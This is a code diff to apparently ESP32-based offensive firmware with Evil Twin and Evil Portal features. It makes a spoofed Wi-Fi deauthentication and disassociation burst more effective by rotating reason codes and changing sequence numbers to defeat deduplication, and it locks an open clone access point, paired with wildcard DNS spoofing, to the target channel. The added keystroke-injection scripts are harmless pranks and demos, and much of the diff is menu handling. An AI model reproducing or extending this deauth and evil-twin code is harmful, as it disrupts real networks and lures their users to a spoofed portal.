@@ -219,12 +219,20 @@ static uint8_t deauthFrame[26] = {
 // Blast a short burst of spoofed deauth + disassoc frames at the target AP.
 void sendDeauthBurst() {
   if (!twinActive) return;
+  static uint16_t seq = 0;
+  static const uint8_t reasons[] = { 1, 7, 4 };   // some clients honor only certain codes
   memcpy(deauthFrame + 10, twinBSSID, 6);
   memcpy(deauthFrame + 16, twinBSSID, 6);
-  for (int i = 0; i < 4; i++) {
-    deauthFrame[0] = 0xC0;             // deauthentication
+  for (int i = 0; i < 6; i++) {
+    // Fresh sequence number each frame so APs/clients don't dedupe the burst.
+    seq++;
+    deauthFrame[22] = (uint8_t)(seq << 4);
+    deauthFrame[23] = (uint8_t)(seq >> 4);
+    deauthFrame[24] = reasons[i % 3];             // rotate the reason code
+    deauthFrame[25] = 0x00;
+    deauthFrame[0] = 0xC0;                        // deauthentication
     esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
-    deauthFrame[0] = 0xA0;             // disassociation
+    deauthFrame[0] = 0xA0;                        // disassociation
     esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
     twinDeauthCount += 2;
   }
@@ -1710,6 +1718,58 @@ void sendDuckLibrary() {
   LIB("Examples", "DEFINE / VAR + random DELAY", "Shows constants, variables and randomized timing.",
       "REM DuckyScript 3.0-lite features\nDEFINE #APP notepad\nVAR $msg = Variables work!\nDELAY 500\n"
       "GUI r\nDELAY 300-700\nSTRING #APP\nENTER\nDELAY 900\nSTRINGLN $msg\n");
+  LIB("Examples", "REPEAT demo", "Types a line, then repeats the last line a few times.",
+      "REM REPEAT re-runs the previous line\nDELAY 500\nSTRINGLN tap tap\nREPEAT 3\n");
+  // --- More Windows ---
+  LIB("Windows", "Task Manager", "Open Task Manager (Ctrl+Shift+Esc).",
+      "REM Open Task Manager\nDELAY 400\nCTRL SHIFT ESC\n");
+  LIB("Windows", "Show desktop", "Minimize everything to the desktop (Win+D).",
+      "REM Show the desktop\nDELAY 300\nGUI d\n");
+  LIB("Windows", "Settings", "Open the Windows Settings app (Win+I).",
+      "REM Open Settings\nDELAY 300\nGUI i\n");
+  LIB("Windows", "Emoji picker", "Open the emoji panel and type one (Win+.).",
+      "REM Emoji picker demo\nDELAY 400\nGUI .\nDELAY 600\nENTER\n");
+  // --- More macOS ---
+  LIB("macOS", "Spotlight -> Notes", "Open Notes via Spotlight and type a line.",
+      "REM macOS Notes demo\nDELAY 500\nGUI SPACE\nDELAY 400\nSTRING Notes\nENTER\nDELAY 900\nSTRINGLN Hello from the Stick!\n");
+  LIB("macOS", "Mission Control", "Show all windows (Ctrl+Up).",
+      "REM Mission Control\nDELAY 300\nCTRL UP\n");
+  // --- More Linux ---
+  LIB("Linux", "Type in terminal", "Open a terminal and echo a line.",
+      "REM Linux echo demo\nDELAY 500\nCTRL ALT t\nDELAY 800\nSTRINGLN echo Hello from the Stick\n");
+  // --- More Text / awareness ---
+  LIB("Text", "Type an emoji note", "Type a short multi-line note.",
+      "REM Multi-line text\nDELAY 400\nSTRINGLN Line one.\nSTRINGLN Line two.\nSTRINGLN Line three.\n");
+  LIB("Awareness", "Lock reminder", "Opens Notepad and reminds the user to lock their PC.",
+      "REM Awareness: lock your machine\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
+      "STRINGLN Reminder: press Win+L whenever you step away.\nSTRINGLN Unattended + unlocked = an open door.\n");
+  // --- Funny (harmless, reversible pranks; US layout, Windows unless noted) ---
+  LIB("Funny", "Rickroll", "Opens the browser to a certain classic music video.",
+      "REM Never gonna give you up\nDELAY 500\nGUI r\nDELAY 300\n"
+      "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER\n");
+  LIB("Funny", "Hacked + Rickroll", "Types a SYSTEM HACKED warning box in Notepad, then rickrolls.",
+      "REM Prank: SYSTEM HACKED warning box, then a rickroll\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
+      "STRINGLN ####################################\n"
+      "STRINGLN #                                  #\n"
+      "STRINGLN #     !!!  SYSTEM HACKED  !!!      #\n"
+      "STRINGLN #      all your base are ours      #\n"
+      "STRINGLN #                                  #\n"
+      "STRINGLN ####################################\n"
+      "STRINGLN    relax... it is a rickroll\n"
+      "DELAY 1500\nGUI r\nDELAY 300\n"
+      "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER\n");
+  LIB("Funny", "Ghost writer", "Opens Notepad and slowly types a spooky message (random delays).",
+      "REM Spooky typing\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
+      "STRING I\nDELAY 300-700\nSTRING  can\nDELAY 300-700\nSTRING  see\nDELAY 300-700\nSTRINGLN  you...\n");
+  LIB("Funny", "Dad joke", "Opens Notepad and types a groan-worthy joke.",
+      "REM Dad joke\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
+      "STRINGLN Why did the developer go broke?\nDELAY 800\nSTRINGLN Because he used up all his cache.\n");
+  LIB("Funny", "ASCII cat", "Opens Notepad and draws a little cat.",
+      "REM ASCII cat\nDELAY 500\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 900\n"
+      "STRINGLN  =^..^=\nSTRINGLN ( meow )\n");
+  LIB("Funny", "Caps Lock disco", "Blinks Caps Lock a few times, then leaves it as it was.",
+      "REM Caps Lock disco - 4 toggles returns to the original state\nDELAY 500\n"
+      "CAPSLOCK\nDELAY 200\nCAPSLOCK\nDELAY 200\nCAPSLOCK\nDELAY 200\nCAPSLOCK\n");
   #undef LIB
   o += "]";
   webServer.send(HTTP_CODE, "application/json", o);
@@ -2268,6 +2328,7 @@ void startTwin(int idx) {
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(twinSSID.c_str(), NULL, twinChannel);   // open clone on the target channel
+  esp_wifi_set_channel(twinChannel, WIFI_SECOND_CHAN_NONE);  // lock TX to the target channel
   dnsServer.start(DNS_PORT, "*", APIP);               // DNS spoofing (HTTP only)
   webServer.begin();
   portalStarted = true;
@@ -2283,8 +2344,14 @@ void startTwin(int idx) {
 
 // Buttons for the target picker (BtnB scrolls, BtnA selects).
 void handleScanButtons() {
+  static bool backArmed = false;
+  if (M5.BtnB.pressedFor(600)) {   // hold = back to the Evil Portal menu
+    if (!backArmed) { backArmed = true; WiFi.mode(WIFI_OFF); appState = ST_MENU_PORTAL; menuSel = 1; drawMenu(true); }
+    return;
+  }
   int total = scanCount + 2;
-  if (M5.BtnB.wasPressed()) {
+  if (M5.BtnB.wasReleased()) {
+    if (backArmed) { backArmed = false; return; }
     scanSel = (scanSel + 1) % total;
     drawScanMenu();
   }
@@ -2495,7 +2562,9 @@ void drawMenuFooter(int n) {
   M5.Lcd.setTextSize(1);
   M5.Lcd.setTextColor(C_MUTED);
   M5.Lcd.setTextDatum(BL_DATUM);
-  M5.Lcd.drawString("B:move  A:select", 6, 134);
+  // On submenus, advertise the hold-to-go-back shortcut.
+  M5.Lcd.drawString(appState == ST_MENU_MAIN ? "B:move  A:select"
+                                             : "B:move  holdB:back  A:ok", 6, 134);
   M5.Lcd.setTextDatum(BR_DATUM);
   M5.Lcd.drawString(String(menuSel + 1) + "/" + String(n), 234, 134);
 }
@@ -2687,10 +2756,24 @@ void selectCurrent() {
   }
 }
 
-// BtnB scrolls the selection (animated), BtnA activates it.
+// Tap BtnB to scroll the selection; hold BtnB to go back up one level (no need
+// to scroll to "Back"); BtnA activates. A hold triggers the back action once and
+// then swallows the release, so it never also advances the selection.
 void handleMenuButtons() {
   if (appState == ST_MENU_SCAN) { handleScanButtons(); return; }  // Evil Twin target picker
-  if (M5.BtnB.wasPressed()) {
+
+  static bool backArmed = false;
+  if (M5.BtnB.pressedFor(600)) {                 // hold = back to the parent menu
+    if (!backArmed) {
+      backArmed = true;
+      if      (appState == ST_MENU_PORTAL) { appState = ST_MENU_MAIN; menuSel = 0; drawMenu(true); }
+      else if (appState == ST_MENU_DUCK)   { appState = ST_MENU_MAIN; menuSel = 1; drawMenu(true); }
+      else if (appState == ST_MENU_CONFIG) { appState = ST_MENU_MAIN; menuSel = 3; drawMenu(true); }
+    }
+    return;                                      // main menu has no parent
+  }
+  if (M5.BtnB.wasReleased()) {                   // tap = scroll the selection
+    if (backArmed) { backArmed = false; return; }   // this release ends a hold-back
     int oldSel = menuSel;
     menuSel = (menuSel + 1) % currentMenuCount();
     moveSelection(oldSel);
